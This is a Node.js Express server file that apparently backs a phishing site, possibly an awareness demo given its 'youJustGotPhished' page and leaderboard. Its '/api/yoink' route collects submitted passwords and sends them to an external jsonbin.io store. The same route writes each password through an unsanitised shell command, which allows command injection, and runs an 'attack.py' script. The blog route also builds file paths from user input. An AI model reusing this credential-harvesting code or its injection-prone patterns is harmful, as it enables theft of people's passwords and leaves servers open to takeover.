const express = require("express");
const path = require("path");
const { exec } = require("child_process");
const fetch = require("node-fetch");
const dotenv = require("dotenv");
const bodyParser = require("body-parser");
const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
const http = require("http");

dotenv.config();

const jsonParser = bodyParser.json();

const app = express();

app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile("phishing.html", { root: path.join(__dirname, "public") });
});

app.get("/leaderboard", (req, res) => {
  res.sendFile(path.join(__dirname + "/../public/leaderboard.html"));
});

app.get("/phishing", (req, res) => {
  res.sendFile("phishing.html", {
    root: path.join(__dirname, "/../public"),
  });
});

app.get("/api/leaderboard", async (req, res) => {
  return { hello: "world" };
});

const runPython = (pass) => {
  console.log("running python!");
  exec(`echo ${pass} > yoink.out`, (err, stdout, stderr) => {
    if (err) {
      console.log("BAD SHELL!");
      return;
    }
  });

  exec("python3 attack.py", (err, stdout, stderr) => {
    if (err) {
      console.log("BAD PYTHON");
      return;
    }
    console.log("stdout: ", stdout);
  });
  return { hehe: "YOINKKK" };
};

app.post("/generate_url", async (req, res) => {
  console.log("in route");
});

app.post("/api/yoink", jsonParser, async (ureq, res) => {
  let pass = ureq.body.pass;
  runPython(pass);
  console.log("yoink: ", pass);
  const get_url = `https://api.jsonbin.io/v3/b/${process.env.BIN_ID}/latest`;
  const update_url = `https://api.jsonbin.io/v3/b/${process.env.BIN_ID}`;
  const headers = {
    "Content-Type": "application/json",
    "X-Master-Key": process.env.BIN_API_KEY,
  };

  const read = await fetch(get_url, {
    headers: headers,
  })
    .then((res) => res.json())
    .then((json) => {
      // console.log("json: ", json);
      json.record.pass.push(pass);
      // console.log("[after] json: ", JSON.stringify(json.record));
      return fetch(update_url, {
        method: "put",
        body: JSON.stringify({ pass: json.record.pass }),
        headers: headers,
      });
    })
    .then((uresp) => uresp.json())
    .then((result) => console.log(result));
  return res.status(200).json({ message: "ayo" });
});

app.get("/sus/:id", async (req, res) => {
  res.sendFile("youJustGotPhished.html", {
    root: path.join(__dirname, "/../public"),
  });
});

app.get("/blog/", async (req, res) => {
  res.sendFile(path.join(__dirname + `/../public/blog/index.html`));
});

app.get("/blog/:id", async (req, res) => {
  res.sendFile(path.join(__dirname + `/../public/blog/${req.params.id}.html`));
});

app.listen(process.env.PORT || 3000);
console.log("starting server at port: ", process.env.PORT);

module.exports = app;
